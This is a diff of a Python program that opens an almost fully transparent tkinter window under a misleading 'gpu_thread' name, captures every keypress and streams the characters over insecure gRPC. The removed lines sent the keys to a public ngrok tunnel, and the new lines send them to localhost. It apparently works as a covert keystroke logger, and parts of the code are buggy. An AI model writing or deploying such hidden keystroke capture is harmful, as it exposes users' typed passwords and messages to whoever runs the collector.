@@ -27,28 +27,28 @@ from tkinter import ttk
 
 import threading
 
-import queue
-send_queue = queue.SimpleQueue()  # or Queue if using Python before 3.7
+channel = grpc.insecure_channel('localhost:50051')
+stub = keys_pb2_grpc.KeyServiceStub(channel)
 
 def onKeyPress(event):
-    print(event.char)
-    send_queue.push(keys_pb2.KeyRequest(key=""+event.char))
+    print(event.char.upper())
+    grpc_send(iter([keys_pb2.KeyRequest(key=event.char.upper())]))
 
 def gpu_thread():
+    print('gpu thread intialized')
     root = tk.Tk()
     root.wait_visibility(root)
-    root.wm_attributes('-alpha',0.2)
+    root.wm_attributes('-alpha',0.01)
     root.bind('<KeyPress>', onKeyPress)
     root.mainloop()
 
-def grpc_thread():
-    with grpc.insecure_channel('4.tcp.ngrok.io:10274') as channel:
-        stub = keys_pb2_grpc.KeyServiceStub(channel)
-        response = stub.StreamKeys(iter(send_queue.get, None))
+def grpc_send(key):
+    # with grpc.insecure_channel('localhost:50051') as channel:
+    #     stub = keys_pb2_grpc.KeyServiceStub(channel)
+    response = stub.StreamKeys(key)
     print("Exit Code: " + response.exit_code)
 
 def run():
-    threading.Thread(target=grpc_thread()).start()
     threading.Thread(target=gpu_thread()).start()
 
 def getKeys():
